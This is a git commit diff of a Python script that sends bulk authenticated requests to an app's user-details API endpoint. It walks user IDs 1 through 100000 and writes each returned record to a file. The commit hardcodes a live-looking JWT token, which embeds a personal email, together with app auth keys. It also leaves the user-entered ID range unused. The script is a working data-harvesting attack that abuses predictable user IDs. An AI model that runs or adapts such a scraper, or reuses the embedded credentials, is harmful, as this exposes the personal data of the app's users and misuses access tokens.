e9eab02431698eafdbd076a1337bba25df6d7602
AnkurKumarji <86411132+AnkurKumarji@users.noreply.github.com>
2021-09-13 12:31:53 +0530

    Update Cloud.py

--- Cloud.py
+++ Cloud.py
@@ -1,16 +1,18 @@
 import grequests
 
-range1 = int(input("Enter Starting Number : "))
-range2 = int(input("Enter Ending Number   : "))
+r1 = int(input("Enter Starting Range : "))
+r2 = int(input("Enter Ending Range : "))
+fl_name = str(input("Enter File Name No. : "))
+
 urls,tab = [],"\t"
-mn_url = "http://rozgarapi.appx.co.in/get/get_user_dt?userid="
-for i in range(range1,range2):urls.append(str(mn_url+str(i)))
+mn_url = "https://exampur.appx.co.in/api/get/get_user_dt?userid="
+for i in range(1,100000):urls.append(str(mn_url+str(i)))
 print("Url Done")
 
-headers = {'Authorization': '13YjoB7buXUpA','Auth-Key': 'appxapi','Host': 'rozgarapi.appx.co.in','User-Agent': 'okhttp/3.12.12'}
+headers = {'Authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ImFua3Vya3VtYXI0Mjk5QGdtYWlsLmNvbSIsInRpbWVzdGFtcCI6MTYzMTUxNDU0NX0.HKEjNCdfvnJ32PqEgVpWilPAySI9jBLD2AQrEhzpc4o','Client-Service': 'ExampurApp','Auth-Key': 'exampurapi','Host': 'exampur.appx.co.in','User-Agent': 'okhttp/3.12.12'}
 req = (grequests.get(u,headers=headers,timeout=3) for u in urls)
 data = grequests.map(req)
-with open("Rojagar_Ankit_1.txt","a") as f:
+with open(f"Exampur_{fl_name}.txt","a") as f:
     for i in data:
         try:
             i = i.json()
